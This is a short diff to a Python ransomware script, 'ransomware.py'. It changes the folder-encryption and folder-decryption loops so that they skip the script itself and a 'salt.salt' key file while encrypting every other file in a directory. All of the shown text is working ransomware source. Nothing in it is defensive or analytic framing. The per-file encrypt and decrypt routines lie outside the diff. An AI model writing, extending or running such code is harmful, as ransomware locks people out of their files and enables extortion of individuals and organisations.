@@ -62,9 +62,9 @@ def encrypt(filename, key):
 
 """function that encrypt a folder"""
 def encrypt_folder(foldername, key):
-    # if it's a folder, encrypt the entire folder (i.e all the containing files) execpt the ransomware.py file otherwise the decryption will be impossible
+    # if it's a folder, encrypt the entire folder (i.e all the containing files) execpt the 'ransomware.py' file and the 'salt.salt' file otherwise the decryption will be impossible
     for child in pathlib.Path(foldername).glob("*"):
-        if child.is_file() and os.path.basename(child)!="ransomware.py":
+        if child.is_file() and os.path.basename(child)!="ransomware.py" and os.path.basename(child)!="salt.salt":
             print(f"[*] Encrypting {child}")
             # encrypt the file
             encrypt(child, key)
@@ -92,9 +92,9 @@ def decrypt(filename, key):
 
 """decrypt a folder"""
 def decrypt_folder(foldername, key):
-    # if it's a folder, decrypt the entire folder execpt to the 'ransomware.py' file that is not encrypted
+    # if it's a folder, decrypt the entire folder execpt to the 'ransomware.py' file and the 'salt.salt' file that are not encrypted
     for child in pathlib.Path(foldername).glob("*"):
-        if child.is_file() and os.path.basename(child)!="ransomware.py":
+        if child.is_file() and os.path.basename(child)!="ransomware.py" and os.path.basename(child)!="salt.salt":
             print(f"[*] Decrypting {child}")
             # decrypt the file
             decrypt(child, key)
